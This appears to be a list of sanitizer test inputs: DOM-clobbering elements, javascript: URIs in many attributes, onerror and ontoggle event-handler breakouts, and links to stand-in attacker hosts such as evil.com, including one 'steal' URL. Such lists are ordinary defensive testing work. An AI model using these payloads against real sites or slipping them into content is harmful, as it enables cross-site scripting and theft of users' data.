# DOM clobber
<img name="attributes" src="x">
<img name="querySelector" src="x">
<img name="location" src="x">
<img name="body" src="x">
<img name="head" src="x">
<div name="attributes"></div>
<span name="cookie"></span>
<img name="src" src="x">

# protocols from ANCHOR_SCHEMES
[a](github-mac://open?file=/etc/passwd)
[b](github-windows://open?file=/etc/passwd)
[c](xmpp:evil@attacker.com)
[d](irc://evil.com/%0aPRIVMSG)
[e](ircs://evil.com)

# img longdesc (URL attr)
<img src="x" longdesc="javascript:alert(1)">
<img src="x" longdesc="https://evil.com/steal">

# action/target on allowed elements
<a href="https://example.com" action="javascript:alert(1)">x</a>
<a href="https://example.com" target="javascript:alert(1)">x</a>
<a href="https://example.com" target="`"><img src=x onerror=alert(1)>">x</a>
<img src="x" target="foo">
<img src="x" name="foo" target="bar">

# aria / label breakout
<img src="x" aria-label="a"><img src=y onerror=alert(1)>

# usemap / ismap
<img src="x" usemap="#m">
<img src="x" ismap>

# valuescope / itemscope on div
<div itemscope itemtype="https://evil.com/x"><img src=x></div>

# datetime / cite
<del cite="javascript:alert(1)">x</del>
<ins cite="javascript:alert(1)">x</ins>
<blockquote cite="javascript:alert(1)">x</blockquote>
<q cite="javascript:alert(1)">x</q>

# open on details (allowed in all)
<details open>q</details>
<details open ontoggle=alert(1)>q</details>

# progress / prompt
<progress value="1" max="10">
<progress name="x">

# ruby
<ruby>x<rt>y</rt></ruby>

# time
<time datetime="javascript:alert(1)">x</time>
